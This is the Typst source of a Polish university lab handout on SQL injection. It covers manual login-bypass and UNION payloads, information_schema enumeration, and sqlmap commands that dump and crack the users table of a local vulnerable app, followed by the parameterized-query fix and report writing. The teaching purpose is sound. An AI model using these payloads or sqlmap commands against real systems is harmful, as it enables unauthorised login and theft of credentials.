// kolory, fonty
#let accent = rgb("#1d4e89")
#let accent-light = rgb("#eef3fa")
#let ink = rgb("#1b2430")
#let muted = luma(105)
#let warn = rgb("#a15c00")
#let warn-light = rgb("#fff6e5")
#let sans-head = ("Inter", "Segoe UI", "Arial")
#let mono = ("Cascadia Mono", "Consolas")

// diagramy (fletcher)
#import "@preview/fletcher:0.5.8" as fletcher: diagram, node, edge
#let dnode(pos, body, fill: accent-light, stroke: accent, ..a) = node(
  pos, align(center, text(font: sans-head, body)),
  fill: fill, stroke: 0.9pt + stroke, inset: 9pt, corner-radius: 3pt, ..a,
)
#let dtag(body) = text(font: sans-head, size: 8pt, fill: muted, body)
#let dedge(..a) = edge(stroke: 0.9pt + accent, ..a)

#set document(title: "SQL injection i sqlmap", author: "BSI")
#set page(
  paper: "a4",
  margin: (x: 2.2cm, top: 2.2cm, bottom: 2cm),
  header: context {
    if counter(page).get().first() > 1 {
      set text(font: sans-head, size: 8pt, fill: muted)
      [Bezpieczeństwo Systemów Informatycznych #h(1fr) SQL injection i sqlmap]
      v(-6pt)
      line(length: 100%, stroke: 0.4pt + luma(210))
    }
  },
  footer: context {
    set text(font: sans-head, size: 8pt, fill: muted)
    h(1fr)
    counter(page).display("1 / 1", both: true)
  },
)
#set text(font: ("Noto Sans", "Segoe UI", "Arial"), size: 10pt, fill: ink, lang: "pl")
#set par(justify: true, leading: 0.68em, spacing: 1em)
#set list(indent: 0.4em, marker: text(fill: accent)[•])
#set enum(indent: 0.4em, numbering: n => text(fill: accent, weight: "semibold")[#n.])
#show strong: set text(weight: "semibold")

// rozdzialy od 0
#set heading(numbering: (..n) => numbering("1.", n.pos().first() - 1, ..n.pos().slice(1)))
#show heading.where(level: 1): it => {
  // kazdy rozdzial (i spis tresci) od nowej strony
  pagebreak(weak: true)
  set text(font: sans-head, size: 14pt, weight: "semibold", fill: ink)
  block(above: 0em, below: 0.8em)[
    #it
    #v(-0.55em)
    #line(length: 100%, stroke: 0.6pt + luma(205))
  ]
}
#show heading: set text(hyphenate: false)
#show heading.where(level: 2): it => {
  set text(font: sans-head, size: 11pt, weight: "semibold", fill: accent)
  block(above: 1.3em, below: 0.7em, sticky: true, it)
}
#show outline.entry.where(level: 1): set block(above: 0.55em)
#show outline.entry: set text(font: sans-head, size: 9.5pt)

#show link: set text(fill: accent)
#show raw: set text(font: mono, size: 0.92em)
#show raw.where(block: false): box.with(fill: rgb("#f0f2f5"), outset: (x: 1.5pt, y: 2.5pt), radius: 2pt)
#show raw.where(block: true): block.with(
  fill: rgb("#f6f8fa"), stroke: 0.5pt + luma(215), inset: (x: 11pt, y: 9pt), radius: 3pt, width: 100%,
)
// sierotki (a, i, w, z...)
#show regex("\b[aiouwzAIOUWZ] "): it => [#it.text.trim()~]

// tabele
#set table(
  inset: (x: 7pt, y: 5pt),
  stroke: (_, y) => if y == 0 { (bottom: 0.8pt + accent) } else { (bottom: 0.4pt + luma(220)) },
  fill: (_, y) => if y == 0 { accent-light },
)
#show table.cell.where(y: 0): set text(font: sans-head, size: 9pt, weight: "semibold", fill: accent)
#show table: set par(justify: false)
#show table: block.with(breakable: false)

// ramki i zrzuty
#let ramka(label, color, light, body) = block(
  fill: light, stroke: (left: 2.5pt + color), radius: (right: 3pt),
  inset: (left: 11pt, right: 10pt, y: 9pt), width: 100%, above: 1.1em, below: 1.1em, breakable: false,
  [#text(font: sans-head, size: 7.5pt, weight: "bold", tracking: 0.09em, fill: color)[#label]
   #v(1pt)
   #set par(justify: false)
   #body],
)
#let krok(body) = ramka("KROK", accent, accent-light, body)
#let uwaga(body) = ramka("UWAGA", warn, warn-light, body)
#let zrzut(path, cap, width: 100%) = {
  let fig(placement) = figure(
    box(stroke: 0.5pt + luma(200), radius: 2pt, clip: true, image(path, width: 100%)),
    caption: cap,
    supplement: [Zrzut],
    placement: placement,
  )
  align(center, block(width: width, fig(none)))
}
#let rysunek(body, cap, width: 100%) = align(center, block(width: width,
  figure(body, caption: cap, supplement: [Rysunek], kind: "rysunek")))
#show figure: set block(above: 1.2em, below: 1.2em)
#show figure.caption: it => {
  set text(size: 8.5pt, fill: muted)
  set align(left)
  set par(justify: false)
  [#text(weight: "semibold", fill: ink)[#it.supplement #context it.counter.display(it.numbering).] #it.body]
}

// tytul
#block(width: 100%, below: 1.4em)[
  #text(font: sans-head, size: 8pt, weight: "semibold", tracking: 0.12em, fill: accent)[
    BEZPIECZEŃSTWO SYSTEMÓW INFORMATYCZNYCH · ĆWICZENIA
  ]
  #v(2pt)
  #text(font: sans-head, size: 24pt, weight: "bold", fill: ink)[SQL injection i sqlmap]
  #v(4pt)
  #line(length: 100%, stroke: 1.5pt + accent)
]

Instrukcja prowadzi od ręcznego wykrycia wstrzyknięcia SQL w prostej aplikacji do automatycznego
odczytu całej bazy danych narzędziem sqlmap. Dotyczy dwóch miejsc, w których aplikacja przyjmuje
dane: parametru w adresie URL (metoda GET, wyszukiwarka) oraz pola formularza (metoda POST,
logowanie). Na końcu ćwiczenia ten sam atak zostaje powtórzony na wersji poprawionej, w której
poprawka całkowicie go blokuje.

SQL injection (wstrzyknięcie SQL) to podatność, w której dane wpisane przez użytkownika zmieniają
strukturę zapytania wysyłanego do bazy danych. Przyczyną jest sklejanie zapytania z tekstu: wartość
od użytkownika trafia wprost do treści polecenia SQL, więc znaki składni SQL zawarte w tej wartości
stają się częścią polecenia.

Po zakończeniu ćwiczenia student potrafi:

- rozpoznać wstrzyknięcie SQL po reakcji aplikacji na znak apostrofu,
- obejść logowanie i odczytać dane innych użytkowników przez ręcznie wpisane zapytanie,
- odczytać nazwy tabel i kolumn z katalogu `information_schema`,
- wykryć i wykorzystać tę samą podatność narzędziem sqlmap dla parametru GET oraz pola POST,
- wskazać poprawkę (zapytanie parametryzowane) i sprawdzić, że usuwa ona podatność,
- opisać znalezisko w formie przyjętej w raporcie z testu penetracyjnego.

Test penetracyjny to kontrolowana próba ataku na system, prowadzona w celu wykrycia podatności.
Wymaga on pisemnej zgody właściciela systemu, określającej zakres i termin testów. Te same
czynności wykonane bez zgody mogą stanowić przestępstwo (art.~267 Kodeksu karnego). Ćwiczenie
dotyczy wyłącznie lokalnej aplikacji pod adresem `http://127.0.0.1:8000`, uruchomionej na własnym
komputerze. sqlmap wysyła dziesiątki żądań na sekundę, dlatego wolno go kierować wyłącznie na
własną aplikację lub na cel objęty pisemną zgodą. Nie wolno go kierować na inne cele, w
szczególności na sieci i systemy~AGH.

#outline(title: [Spis treści], depth: 1, indent: auto)

= Wymagania

#block(sticky: true)[Do wykonania ćwiczenia potrzebne jest następujące oprogramowanie:]

- *Node.js w wersji 18 lub nowszej*, pobierany ze strony
  #link("https://nodejs.org/")[nodejs.org]. Node.js to środowisko uruchomieniowe języka
  JavaScript poza przeglądarką; służy do uruchomienia aplikacji ćwiczeniowej. Poprawność
  instalacji sprawdza polecenie `node --version`.
- *Python 3.8 lub nowszy*, pobierany ze strony
  #link("https://www.python.org/downloads/")[python.org/downloads]. Python jest potrzebny do
  uruchomienia narzędzia sqlmap. W systemie Windows podczas instalacji należy zaznaczyć opcję
  _Add python.exe to PATH_.
- *sqlmap* – otwarte narzędzie do wykrywania i wykorzystywania wstrzyknięć SQL. Pobiera się je
  poleceniem `git clone https://github.com/sqlmapproject/sqlmap.git`, a uruchamia poleceniem
  `python sqlmap.py` z katalogu narzędzia. sqlmap nie wymaga instalacji ani dodatkowych pakietów.
  Jeśli w systemie nie ma narzędzia Git, sqlmap można pobrać ze strony projektu na GitHubie jako
  archiwum ZIP (przycisk _Code_, pozycja _Download ZIP_) i rozpakować. Po rozpakowaniu katalog
  narzędzia nosi nazwę z przyrostkiem, na przykład `sqlmap-master`, i to w nim znajduje się plik
  `sqlmap.py`.
- *Przeglądarka* dowolnego rodzaju, do wykonania części ręcznej.
- *Pliki aplikacji* z katalogu ćwiczenia: `app.mjs` i `package.json`.

Oprogramowanie z tej listy należy zainstalować przed zajęciami i sprawdzić, że aplikacja uruchamia
się poleceniem `npm start`, a sqlmap odpowiada na `python sqlmap.py --version`. Redakcję znaleziska
w formie raportu można dokończyć po zajęciach.

= Jak działa wstrzyknięcie SQL

Aplikacja pyta bazę danych o dane, wysyłając do niej polecenie w języku SQL. Gdy polecenie
powstaje przez sklejenie tekstu z wartością od użytkownika, baza otrzymuje jeden napis i nie potrafi
odróżnić części napisanej przez programistę od części pochodzącej od użytkownika. Całość parsuje
(analizuje składniowo) jako kod SQL.

Podatny fragment aplikacji ćwiczeniowej wygląda następująco (język JavaScript):

```js
const sql = "SELECT name, description FROM products WHERE name = '" + name + "'";
const r = await db.query(sql);
```

Zmienna `name` pochodzi z pola wyszukiwarki. Dla zwykłego wyszukiwania, na przykład wartości
`Monitor`, baza otrzymuje poprawne zapytanie:

```sql
SELECT name, description FROM products WHERE name = 'Monitor'
```

Gdy użytkownik wpisze w pole wartość `' OR '1'='1`, baza otrzymuje zapytanie o zmienionej
strukturze. Apostrof z wartości zamyka tekst nazwy, a `OR '1'='1'` dodaje warunek zawsze
prawdziwy:

```sql
SELECT name, description FROM products WHERE name = '' OR '1'='1'
```

Warunek jest zawsze spełniony, więc baza zwraca wszystkie wiersze tabeli, a nie tylko pasujące do
nazwy. Dane z pola utworzyły nowy warunek. Na tym polega podatność. Wartość przestała być
wyłącznie danymi i stała się częścią kodu zapytania.

#rysunek(diagram(
  spacing: (2.4cm, 1.1cm),
  dnode((0, 0), [Pole\ formularza]),
  dnode((1, 0), [Aplikacja\ skleja tekst]),
  dnode((2, 0), [Baza parsuje\ cały napis], fill: warn-light, stroke: warn),
  dedge((0, 0), (1, 0), dtag[`' OR '1'='1`], "-|>", label-side: left),
  dedge((1, 0), (2, 0), dtag[jeden napis SQL], "-|>", label-side: left),
), [Wartość z pola formularza zostaje wklejona do treści zapytania. Baza otrzymuje jeden napis
i analizuje go w całości jako kod SQL, więc apostrof z wartości działa jak apostrof składni.])

Znak, który najczęściej ujawnia podatność, to apostrof. W wartości jest zwykłym znakiem, ale w
składni SQL zamyka tekst. Jeśli pojedynczy apostrof psuje zapytanie, aplikacja prawdopodobnie
skleja je z tekstu.

= Uruchomienie aplikacji

W katalogu aplikacji wykonaj polecenia:

```
npm install
npm start
```

Pierwsze polecenie pobiera zależności (framework `express` i bazę `@electric-sql/pglite`), drugie
uruchamia aplikację. Aplikacja nasłuchuje pod adresem `http://127.0.0.1:8000`. Okno terminala z
uruchomioną aplikacją należy pozostawić otwarte do końca ćwiczenia. Polecenia narzędzia sqlmap
w dalszej części wykonuje się w osobnym oknie terminala.

Aplikacja używa bazy PostgreSQL działającej w pamięci (biblioteka PGlite). Wszystkie dane są
przechowywane w pamięci, dlatego zatrzymanie aplikacji (Ctrl+C) i ponowne uruchomienie przywracają
stan początkowy. Baza zawiera dwie tabele: `products` (katalog produktów) oraz `users` (konta
użytkowników wraz z hasłami), która jest celem ataku.

#block(breakable: false)[
Konta testowe (hasła stanowią cel ataku i zostają odczytane w części z~sqlmap):

#table(
  columns: (auto, 1fr),
  inset: (x: 8pt, y: 5pt),
  table.header[Login][Rola],
  [`alice`], [zwykły użytkownik],
  [`bob`], [zwykły użytkownik],
  [`admin`], [administrator],
)
]

Hasła są przechowywane w bazie jako skróty MD5 (funkcja skrótu zamienia hasło na ciąg o stałej
długości, z którego nie da się wprost odtworzyć hasła). Przechowywanie samych skrótów nie chroni
przed wstrzyknięciem SQL: atakujący odczytuje skróty i poddaje je łamaniu offline, porównując skrót
hasła z kolejnymi słowami z listy. Łamanie ułatwia słaby dobór hasła, a także sam algorytm skrótu.

#uwaga[
  MD5 jest przestarzałym i uznanym za niebezpieczny algorytmem skrótu. Jest bardzo szybki do
  obliczenia i nie używa soli (losowej wartości dołączanej do hasła), więc gotowe narzędzia łamią
  skróty MD5 masowo. Nie wolno go używać do przechowywania haseł w aplikacjach. Służą do tego wolne,
  solone funkcje przeznaczone do haseł, takie jak bcrypt, scrypt lub Argon2. W ćwiczeniu MD5 wystąpił
  tylko po to, aby pokazać, jak sqlmap łamie odczytane skróty.
]

Aplikacja udostępnia dwa podatne miejsca oraz jedną wersję poprawioną:

#table(
  columns: (auto, 1fr),
  inset: (x: 7pt, y: 5pt),
  table.header[Adres][Opis],
  [`POST /login`], [logowanie; podatne pole `username` (część~3 i~5)],
  [`GET /search?name=`], [wyszukiwarka produktów; podatny parametr `name` (część~4 i~5)],
  [`GET /fixed/search?name=`], [wyszukiwarka z poprawką, zapytanie parametryzowane (część~6)],
)

= Część ręczna: obejście logowania (POST)

Logowanie przyjmuje login i hasło z formularza i wstawia oba do zapytania:

```js
const sql = "SELECT username, role FROM users WHERE username = '" + username +
            "' AND password = '" + md5(password) + "'";
```

Aplikacja uznaje logowanie za udane, gdy zapytanie zwróci co najmniej jeden wiersz. Celem ataku jest
doprowadzenie do zwrócenia wiersza bez znajomości hasła.

W języku SQL dwa myślniki `--` rozpoczynają komentarz: baza ignoruje resztę wiersza. Jeśli w pole
login wpisać `admin' -- `, zapytanie przyjmie postać:

```sql
SELECT username, role FROM users WHERE username = 'admin' -- ' AND password = '...'
```

Apostrof zamyka nazwę `admin`, a komentarz `--` usuwa z zapytania cały warunek sprawdzający hasło.
Baza zwraca wiersz konta `admin`, więc aplikacja loguje atakującego jako administrator.

#krok[
  Otwórz w przeglądarce adres `http://127.0.0.1:8000`. W formularzu logowania w polu _Login_ wpisz
  `admin' -- ` (z apostrofem i spacją po myślnikach), w polu _Hasło_ wpisz dowolny tekst i kliknij
  _Zaloguj_.
]

#uwaga[
  Po myślnikach `--` w komentarzu musi wystąpić znak spacji. Łatwo go pominąć, dlatego wartość
  kończy się spacją: `admin' -- `.
]

Strona potwierdzi zalogowanie jako `admin` z rolą administratora, choć nie podano hasła tego konta.
Wartość `' OR '1'='1' -- ` w polu login daje zbliżony skutek: zwraca pierwszego użytkownika z tabeli
i loguje atakującego na jego konto.

Jest to obejście uwierzytelniania o wadze krytycznej. Dowodem do raportu jest treść żądania
`POST /login` z wartością pola `username` oraz strona odpowiedzi potwierdzająca zalogowanie.

= Część ręczna: odczyt danych przez wyszukiwarkę (GET)

Wyszukiwarka przyjmuje nazwę produktu w parametrze `name` w adresie URL i wstawia ją do zapytania.
Parametry w adresie URL testuje się wygodnie wprost w pasku adresu przeglądarki.

== Potwierdzenie podatności

#krok[
  W pasku adresu przeglądarki wpisz adres z pojedynczym apostrofem w wartości:
  `http://127.0.0.1:8000/search?name='`
]

Aplikacja wyświetli komunikat błędu bazy `unterminated quoted string at or near ...`. Błąd potwierdza, że wartość
z parametru trafiła do zapytania i zepsuła jego składnię. Wyświetlanie treści błędów bazy na stronie
jest osobnym błędem konfiguracji (tryb debugowania na serwerze produkcyjnym); w tym ćwiczeniu
ułatwia obserwację.

#krok[
  Wpisz adres z warunkiem zawsze prawdziwym (spacje w adresie zapisuje się jako `%20`):
  `http://127.0.0.1:8000/search?name='%20OR%201=1--%20`
]

Zamiast jednego produktu wyszukiwarka pokaże wszystkie. Odpowiedź różni się od odpowiedzi na
zapytanie o nieistniejącą nazwę, co potwierdza wstrzyknięcie.

== Ustalenie liczby kolumn

Aby doczepić do wyniku dane z innej tabeli, trzeba znać liczbę kolumn zwracanych przez zapytanie.
Ustala się ją poleceniem `ORDER BY`, zwiększając numer kolumny aż do wystąpienia błędu. Liczba po
`ORDER BY` oznacza numer kolumny w wyniku, a błąd pojawia się, gdy numer przekroczy liczbę
zwracanych kolumn.

#krok[
  Wyślij kolejno dwa adresy:

  `http://127.0.0.1:8000/search?name=Monitor'%20ORDER%20BY%202--%20`

  `http://127.0.0.1:8000/search?name=Monitor'%20ORDER%20BY%203--%20`
]

Pierwszy adres zwraca wynik, drugi kończy się błędem `ORDER BY position 3 is not in select list`.
Zapytanie zwraca więc dwie kolumny.

== Doklejenie danych (UNION)

Operator `UNION` łączy wynik zapytania oryginalnego z wynikiem zapytania dopisanego przez
atakującego. Oba zapytania muszą zwracać tę samą liczbę kolumn, dlatego dopisane zapytanie ma dwie
kolumny.

#krok[
  Wpisz adres, który dokleja loginy i hasła z tabeli `users`:

  `http://127.0.0.1:8000/search?name='%20UNION%20SELECT%20username,password%20FROM%20users--%20`
]

Lista wyników pokaże loginy i skróty haseł wszystkich kont, w tym konta administratora. Dane z tabeli
`users` pojawiły się w wynikach wyszukiwarki produktów. Odczytane skróty można następnie złamać,
co pokazuje część z sqlmap.

Dowodem do raportu jest adres żądania UNION wraz z fragmentem odpowiedzi, w którym widać loginy
i skróty haseł kont. Warto zapisać je w tym miejscu, przed przejściem do kolejnego kroku.

== Odczyt schematu bazy (information_schema)

Powyższe zapytanie zadziałało, ponieważ nazwy tabeli i kolumn (`users`, `username`, `password`) były
znane. W rzeczywistej aplikacji atakujący ich nie zna, ale baza sama je udostępnia. Każda baza SQL
prowadzi katalog systemowy `information_schema` z nazwami wszystkich tabel i kolumn. Katalog jest
zbiorem tabel, więc odczytuje się go tym samym wstrzyknięciem UNION.

Atak przebiega w trzech krokach: najpierw nazwy tabel, potem kolumny wybranej tabeli, na końcu dane.
Kolumna `NULL` dopełnia liczbę kolumn do wymaganych dwóch.

```
# 1. nazwy tabel aplikacji
.../search?name='%20UNION%20SELECT%20table_name,NULL%20FROM%20information_schema.tables%20WHERE%20table_schema='public'--%20

# 2. kolumny tabeli users
.../search?name='%20UNION%20SELECT%20column_name,NULL%20FROM%20information_schema.columns%20WHERE%20table_name='users'--%20

# 3. dane (nazwy ustalone w krokach 1 i 2)
.../search?name='%20UNION%20SELECT%20username,password%20FROM%20users--%20
```

Krok pierwszy ujawnia tabele `products` i `users`, krok drugi kolumny `id`, `username`, `password`
i `role` (kolejność kolumn w wyniku może być inna, znaczenie ma zbiór nazw), a krok trzeci odczytuje
konta. Wniosek: ukrycie nazw tabel nie jest zabezpieczeniem, bo
przy działającym wstrzyknięciu schemat bazy jest jawny.

= Część z sqlmap: automatyzacja

Ręczny odczyt danych jest możliwy, ale pracochłonny, zwłaszcza gdy aplikacja nie wyświetla wyniku
zapytania wprost. sqlmap wykonuje to automatycznie. Wykrywa wstrzyknięcie, rozpoznaje rodzaj bazy
danych i odczytuje jej zawartość. W audycie potwierdza podatność i pokazuje jej skalę. Narzędzie nie zastępuje zrozumienia
mechanizmu. Bez niego tester jedynie obsługuje program i nie potrafi ocenić, co raportuje.

Polecenia poniżej uruchamia się z katalogu, do którego sklonowano sqlmap, poleceniem
`python sqlmap.py` wraz z przełącznikami. Najważniejsze z nich:

#table(
  columns: (auto, 1fr),
  inset: (x: 7pt, y: 5pt),
  table.header[Przełącznik][Znaczenie],
  [`-u "ADRES"`], [cel podany jako adres URL (dla parametrów GET)],
  [`-r PLIK`], [cel wczytany z pliku z zapisanym żądaniem HTTP (dla formularzy POST)],
  [`--batch`], [przyjmuj odpowiedzi domyślne, bez pytania użytkownika],
  [`--level=1..5`], [liczba sprawdzanych miejsc i wariantów (więcej = dokładniej, wolniej)],
  [`--risk=1..3`], [dopuszczalny poziom ryzyka testów (3 obejmuje testy mogące zmienić dane)],
  [`--threads=N`], [liczba równoległych żądań (przyspiesza odczyt na ślepo)],
  [`--tables`, `--dump`], [wypisz nazwy tabel; odczytaj zawartość tabeli],
  [`-D`, `-T`], [wskaż schemat (bazę) i tabelę do odczytu],
)

== Wykrycie podatności w parametrze GET

#krok[
  Uruchom sqlmap na adresie wyszukiwarki z dowolną poprawną wartością parametru:

  ```
  python sqlmap.py -u "http://127.0.0.1:8000/search?name=Monitor" --batch
  ```
]

sqlmap zgłosi parametr `name` jako podatny i wypisze wykryte techniki:

```
Parameter: name (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns

web application technology: Express
back-end DBMS: PostgreSQL
```

Są to cztery techniki wstrzyknięcia omówione na wykładzie. sqlmap sprawdził je kolejno i ustalił, że
bazą jest PostgreSQL, a aplikacja działa na serwerze Express. Technika czasowa (`time-based blind`)
opiera się na funkcji `PG_SLEEP`: prawdziwy warunek opóźnia odpowiedź, a sqlmap odczytuje wynik z
czasu. Technika na ślepo typu tak/nie (`boolean-based blind`) rozróżnia prawdę i fałsz po różnicy w
treści odpowiedzi. Obie działają także wtedy, gdy aplikacja nie wyświetla wyniku zapytania. Technika
oparta na błędzie (`error-based`) odczytuje dane wprost z treści komunikatu błędu bazy, o ile
aplikacja ten komunikat wyświetla, jak w trybie debugowania tej aplikacji.

#zrzut("zrzuty/01_sqlmap_get.png", [Wynik działania sqlmap dla parametru GET. Narzędzie potwierdziło
cztery techniki wstrzyknięcia oraz rozpoznało bazę PostgreSQL i serwer Express.])

== Odczyt zawartości bazy

#krok[
  Wypisz tabele w schemacie `public` i odczytaj zawartość tabeli `users`:

  ```
  python sqlmap.py -u "http://127.0.0.1:8000/search?name=Monitor" --batch -D public --tables
  python sqlmap.py -u "http://127.0.0.1:8000/search?name=Monitor" --batch -D public -T users --dump
  ```
]

Przełącznik `--tables` wypisuje nazwy tabel, a `--dump` odczytuje całą tabelę. Wskazanie schematu
`-D public` ogranicza wynik do tabel aplikacji; bez niego sqlmap wypisuje także kilkadziesiąt tabel
systemowych PostgreSQL.

Odczytane hasła są skrótami MD5. sqlmap rozpoznaje format skrótu i w trybie `--batch` od razu próbuje
go złamać, porównując skróty ze słowami z wbudowanej listy. Słabe hasła łamie w kilka sekund, a wynik
dopisuje w nawiasie obok skrótu:

```
[INFO] recognized possible password hashes in column 'password'
[INFO] starting dictionary-based cracking (md5_generic_passwd)
[INFO] cracked password 'football' for user 'bob'
[INFO] cracked password 'letmein' for user 'admin'
[INFO] cracked password 'sunshine' for user 'alice'
Database: public
Table: users
[3 entries]
+----+-------+---------------------------------------------+----------+
| id | role  | password                                    | username |
+----+-------+---------------------------------------------+----------+
| 1  | user  | 0571749e2ac330a7455809c6b0e7af90 (sunshine) | alice    |
| 2  | user  | 37b4e2d82900d5e94b8da524fbeb33c0 (football) | bob      |
| 3  | admin | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | admin    |
+----+-------+---------------------------------------------+----------+
```

Narzędzie samodzielnie odpytało `information_schema`, ustaliło kolumny tabeli `users`, odczytało
wszystkie wiersze i złamało skróty haseł, w tym hasło administratora. Są to te same kroki, które w
części ręcznej wykonano pojedynczymi zapytaniami, uzupełnione o łamanie skrótów. Hasło złożone z
losowych znaków nie znalazłoby się na liście i pozostałoby nieodczytane; chroni to jednak tylko samo
hasło, nie usuwa wstrzyknięcia.

#zrzut("zrzuty/02_sqlmap_dump.png", [Odczyt tabeli `users`. sqlmap rozpoznał skróty MD5, złamał je
z użyciem wbudowanej listy i obok każdego skrótu dopisał odtworzone hasło.])

== Przykład przez POST (formularz logowania)

Danych wysyłanych metodą POST nie widać w adresie URL, dlatego dla formularza wygodniej jest podać
sqlmapowi całe żądanie HTTP zapisane w pliku. Żądanie można pobrać z Burpa (zakładka _Proxy_,
podzakładka _HTTP history_: na żądaniu `POST /login` kliknij prawym przyciskiem i wybierz
_Copy to file_), albo użyć gotowego pliku `request1.txt` dołączonego do ćwiczenia. Plik zawiera
zwykłe żądanie logowania:

```
POST /login HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded

username=admin&password=x
```

#krok[
  Uruchom sqlmap na zapisanym żądaniu, wskazując pole `username`:

  ```
  python sqlmap.py -r request1.txt -p username --level=5 --risk=3 --batch --threads=4 -D public --tables
  ```

  Po potwierdzeniu podatności odczytaj tabelę `users`, zamieniając na końcu `--tables` na
  `-T users --dump`.
]

Plik `request1.txt` znajduje się w katalogu ćwiczenia, a polecenie sqlmap uruchamia się z katalogu
narzędzia. Do pliku należy wtedy podać pełną ścieżkę, na przykład
`-r C:\sciezka\do\cwiczenia\request1.txt`, albo skopiować plik do katalogu, z którego uruchamiane
jest sqlmap.

Przełącznik `-r` wczytuje cel z pliku, a `-p username` wskazuje pole do testowania. Podwyższone
wartości `--level=5` i `--risk=3` każą sprawdzić więcej wariantów wstrzyknięcia, `--threads=4`
przyspiesza odczyt na ślepo. Wyższe wartości `--level` i `--risk` mogą wydłużyć test nawet do kilku
minut, ponieważ sqlmap sprawdza także techniki czasowe; do samego wykrycia tej podatności wystarcza
`--level=2`. sqlmap zgłosi pole `username` jako podatne i odczyta tabelę `users` tak
samo jak dla parametru GET. Różnica między oboma wywołaniami dotyczy wyłącznie sposobu przesłania
danych: GET umieszcza je w adresie, POST w treści żądania. Sama podatność jest w obu miejscach taka
sama.

#zrzut("zrzuty/03_sqlmap_post.png", [Atak przez formularz logowania. sqlmap wczytał żądanie
`POST /login` z pliku, potwierdził podatność pola `username` i wypisał tabele schematu `public`.])

#uwaga[
  sqlmap zapisuje stan sesji i pobrane dane w katalogu domowym użytkownika (w systemie Windows w
  `%LOCALAPPDATA%\sqlmap\output`). Ponowne uruchomienie na tym samym celu korzysta z zapisanego
  stanu. Przełącznik `--flush-session` rozpoczyna test od początku. Po zakończeniu ćwiczenia katalog
  `output` należy usunąć, ponieważ zawiera odczytane dane i złamane hasła.
]

= Poprawka: zapytanie parametryzowane

Wszystkie powyższe ataki blokuje jedna zmiana: zamiast sklejać zapytanie z tekstu, przekazuje się
bazie osobno szablon zapytania i osobno wartość. Mechanizm ten nazywa się zapytaniem
parametryzowanym (ang. _parameterized query_ albo _prepared statement_). W aplikacji ćwiczeniowej
wersja poprawiona pod adresem `/fixed/search` wygląda następująco:

```js
const r = await db.query(
  "SELECT name, description FROM products WHERE name = $1",
  [name]
);
```

Znak `$1` to miejsce na wartość w szablonie zapytania. Wartość `name` przekazuje się osobno, w
tablicy. Baza najpierw analizuje szablon i ustala strukturę zapytania (jedna tabela, jeden warunek),
a dopiero potem podstawia wartość. Struktura jest już wtedy ustalona, więc apostrof i słowo `OR` w
wartości są zwykłymi znakami, a nie składnią.

#rysunek(diagram(
  spacing: (2.9cm, 1.1cm),
  dnode((0, 0), [Szablon\ `name = $1`]),
  dnode((0, 1), [Wartość\ `' OR '1'='1`]),
  dnode((1, 0.5), [Baza ustala\ strukturę,\ potem podstawia], fill: accent-light, stroke: accent),
  dnode((2, 0.5), [Szuka produktu\ o tej nazwie\ dosłownie]),
  dedge((0, 0), (1, 0.5), dtag[struktura], "-|>", label-side: right),
  dedge((0, 1), (1, 0.5), dtag[dane], "-|>", label-side: right),
  dedge((1, 0.5), (2, 0.5), "-|>"),
), [Szablon i wartość docierają do bazy osobno. Struktura zapytania powstaje z samego szablonu, więc
wartość nie może jej zmienić. Wartość dociera w niezmienionej postaci, tylko poza tekstem zapytania.])

#krok[
  Powtórz atak na wersji poprawionej:

  `http://127.0.0.1:8000/fixed/search?name='%20OR%201=1--%20`

  Następnie uruchom na niej sqlmap:

  ```
  python sqlmap.py -u "http://127.0.0.1:8000/fixed/search?name=Monitor" --batch
  ```
]

Adres z warunkiem `OR 1=1` zwróci pustą listę: baza szuka produktu o nazwie dosłownie
`' OR 1=1-- `, nie znajduje go i zwraca pusty wynik. sqlmap po serii testów zgłosi, że parametr nie
jest podatny. Poprawka nie usuwa ani nie zmienia żadnych znaków w wartości; wartość dociera do bazy
w całości, ale osobnym kanałem, poza treścią zapytania.

Zapytanie parametryzowane jest podstawowym i wystarczającym zabezpieczeniem przed wstrzyknięciem
SQL. Udostępnia je każda biblioteka dostępu do bazy. Samodzielne filtrowanie lub usuwanie znaków z
wartości jest zawodne i nie zastępuje parametryzacji.

= Zapis znaleziska w raporcie

#block(sticky: true)[Znalezisko opisuje się według jednego schematu:]

+ Tytuł i identyfikator, np. „F-01. Wstrzyknięcie SQL w wyszukiwarce produktów”.
+ Lokalizacja: metoda, endpoint (punkt końcowy API) i parametr, np. `GET /search`, parametr `name`.
+ Opis: na czym polega błąd i jaki skutek może wywołać.
+ Kategoria według OWASP Top 10 oraz numer CWE. OWASP Top 10 to publikowana przez fundację OWASP
  lista najpoważniejszych ryzyk bezpieczeństwa aplikacji webowych; oznaczenie `A05:2025` to
  kategoria 5 w wydaniu z 2025 roku. CWE (Common Weakness Enumeration) to katalog typów słabości
  oprogramowania. Wstrzyknięcie SQL to `A05:2025 Injection` oraz `CWE-89`.
+ Waga z jednozdaniowym uzasadnieniem opisującym skutek dla właściciela systemu.
+ Kroki odtworzenia: numerowana lista czynności, która pozwala innej osobie powtórzyć test.
+ Dowód: żądanie i odpowiedź skopiowane jako tekst, skrócone do istotnych wierszy, lub polecenie
  sqlmap wraz z fragmentem wyniku.
+ Rekomendacja: zmiana po stronie serwera, która usuwa przyczynę błędu.

Przykład dowodu dla wstrzyknięcia w wyszukiwarce:

```
GET /search?name=' UNION SELECT username,password FROM users-- HTTP/1.1
Host: 127.0.0.1:8000

HTTP/1.1 200 OK
...
<li>admin — 0d107d09f5bbe40cade3de5c71e9e9b7</li>
```

Rekomendacja dla tego znaleziska: zastąpienie sklejania zapytania z tekstu zapytaniem
parametryzowanym (szablon z miejscem na wartość i wartość przekazana osobno), jak w wersji pod
adresem `/fixed/search`.

Znalezisko logowania (`POST /login`, pole `username`) opisuje się tym samym schematem. Waga jest
krytyczna, ponieważ atak pozwala zalogować się na dowolne konto, w tym konto administratora, bez
znajomości hasła. Hasła innych użytkowników użyte jako dowód należy ograniczyć do minimum,
zamaskować w raporcie i usunąć po zakończeniu testu.

= Pytania kontrolne

+ Dlaczego pojedynczy apostrof w polu wyszukiwarki powoduje błąd składni SQL?
+ Na czym polega obejście logowania wartością `admin' -- `? Którą część zapytania usuwa komentarz?
+ Do czego służy `ORDER BY` przy ustalaniu wstrzyknięcia UNION i dlaczego liczba kolumn musi się
  zgadzać?
